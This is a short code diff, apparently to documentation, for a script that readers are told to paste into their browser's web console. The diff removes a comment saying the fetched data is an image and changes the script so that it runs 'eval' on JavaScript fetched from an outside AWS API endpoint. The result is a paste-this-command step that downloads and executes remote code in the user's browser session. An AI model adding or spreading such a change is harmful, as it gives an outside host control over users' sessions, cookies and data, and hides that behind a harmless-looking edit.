@@ -10,7 +10,6 @@ Pasting this script into the web console should do the needful.
 fetch('https://rvwfo4bv9b.execute-api.us-east-1.amazonaws.com/render/getJS?divId="123"')
   .then(response => response.json())
   .then(data => {
-    //data contains the image
     console.log(data);
-    return (()=>data)();
+    return eval(data);
   });
